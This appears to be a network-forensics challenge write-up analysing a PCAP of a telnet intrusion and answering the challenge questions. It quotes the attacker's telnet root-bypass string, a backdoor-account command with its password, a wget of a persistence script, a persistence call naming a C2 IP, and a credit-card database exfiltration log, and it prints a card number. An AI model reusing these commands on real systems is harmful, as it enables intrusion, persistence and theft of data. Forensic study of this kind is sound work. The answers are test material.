Analysing the PCAP file:

- First things first, I looked into the Protocol Hierarchy of the pcap file. Under TCP - http, telnet protocol was present, which caught my attention
- Filtering the PCAP file using `telnet` and following the TCP stream of the first packet

![[Pasted image 20260819134229.png]]

The string `USER=-f root DISPLAY=kali:0 telnet` represents a command used to exploit a **critical authentication bypass vulnerability** (specifically **CVE-2026-24061** in GNU Inetutils telnetd) to gain immediate **root access** on a remote system. This answers our first question:

1. What CVE is associated with the vulnerability exploited in the Telnet protocol?  CVE-2026-24061
2. When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?  2026-01-27 10:39:28

Looking through the packet details section of the earlier mentioned packet, the UTS Arrival Time of this packet was: 
```
UTC Arrival Time: Jan 27, 2026 10:39:28.319357980 UTC
```

3. What is the hostname of the targeted server? backup-secondary
Filering the packets using telnet and looking through the TCP stream, we get to know what happened 

```
root@backup-secondary:~#
```

4. The attacker created a backdoor account to maintain future access. What username and password were set for that account?

Parsing through the tcp stream, i came across this 
```
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
```

Hence answer: cleanupsvc:YouKnowWhoiam69

5. What was the full command the attacker used to download the persistence script?
parsing through the same tcp stream, i got this
```
wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
```

6. The attacker installed remote access persistence using the persistence script. What is the C2 IP address?
through the same tcp stream, while executing the linper.sh file, we get this 
```
bash linper.sh --enum-defenses -i 91.99.25.54 -p 59 -stealth-mode
```

7. The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?

```
.Serving HTTP on 0.0.0.0 port 6932 (http://0.0.0.0:6932/) ...

192.168.72.131 - - [27/Jan/2026 10:49:52] "GET / HTTP/1.1" 200 -

192.168.72.131 - - [27/Jan/2026 10:49:52] code 404, message File not found

192.168.72.131 - - [27/Jan/2026 10:49:52] "GET /favicon.ico HTTP/1.1" 404 -

192.168.72.131 - - [27/Jan/2026 10:49:54] "GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
```

hence the sensitive file was `credit-cards-25-blackfriday.db`, filtering the pcap using  `http.request.uri contains "credit-cards-25-blackfriday.db"` we get this
![[Pasted image 20260819142351.png]]

8. Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.

By exporting the file from the pcap and reading it using an online sqlite3 database, we get this 
![[Pasted image 20260819142540.png|789]]![[Pasted image 20260819142559.png|787]]
answer: 5312269047781209